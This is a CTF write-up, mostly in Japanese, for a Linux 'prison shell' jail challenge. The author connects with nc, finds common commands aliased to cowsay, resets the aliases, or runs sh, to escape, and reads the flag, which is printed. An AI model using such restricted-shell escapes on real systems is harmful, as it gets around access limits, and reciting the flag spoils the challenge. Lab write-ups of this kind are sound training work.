# Prison Break:linux:304pts
A linux jail challenge. Find a way out of prison shell! try root!  
Connect with command: $nc 143.198.224.219 21212  
![prison.png](images/prison.png)  
Ce shell fonctionne partiellement. Trouvez un moyen pour devenir root!  
Connectez-vous avec la commande: $nc 143.198.224.219 21212  
`143.198.224.219:21212`  

# Solution
接続先が渡されているので、ncで接続してみる。  
```bash
$ nc 143.198.224.219 21212
user @ csictf: $
whoami
ctf
user @ csictf: $
ls
 ________________________________________
/ Don't look at me, I'm just here to say \
\ moo.                                   /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
user @ csictf: $
echo "satoki"
satoki
user @ csictf: $
pwd
 ________________________________________
/ Don't look at me, I'm just here to say \
\ moo.                                   /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
user @ csictf: $
```
`echo`などごく少数の機能に制限されたシェルのようだ。  
牛の出力に囚われているので、ここからの脱出を目指す。  
`alias`を見ると`ls`や`cat`がつぶされていたので元に戻す。  
```bash
user @ csictf: $
alias
alias awk='cowsay Don\'\''t look at me, I\'\''m just here to say moo.'
alias cat='cowsay Don\'\''t look at me, I\'\''m just here to say moo.'
alias cd='cowsay Don\'\''t look at me, I\'\''m just here to say moo.'
alias find='cowsay Don\'\''t look at me, I\'\''m just here to say moo.'
alias grep='cowsay Don\'\''t look at me, I\'\''m just here to say moo.'
alias head='cowsay Don\'\''t look at me, I\'\''m just here to say moo.'
alias less='cowsay Don\'\''t look at me, I\'\''m just here to say moo.'
alias ls='cowsay Don\'\''t look at me, I\'\''m just here to say moo.'
alias more='cowsay Don\'\''t look at me, I\'\''m just here to say moo.'
alias pwd='cowsay Don\'\''t look at me, I\'\''m just here to say moo.'
alias sed='cowsay Don\'\''t look at me, I\'\''m just here to say moo.'
alias tail='cowsay Don\'\''t look at me, I\'\''m just here to say moo.'
user @ csictf: $
alias cat='cat'
user @ csictf: $
alias ls='ls'
user @ csictf: $
ls
flag.txt
script.sh
start.sh
user @ csictf: $
cat flag.txt
OFPPT-CTF{Pr1s0n_sh3ll_3sc4p3d}
```
flagが得られた。  
別解として`sh`も使えたようだ。  
```bash
$ nc 143.198.224.219 21212
user @ csictf: $
sh
ls
flag.txt
script.sh
start.sh
cat flag.txt
OFPPT-CTF{Pr1s0n_sh3ll_3sc4p3d}
```

## OFPPT-CTF{Pr1s0n_sh3ll_3sc4p3d}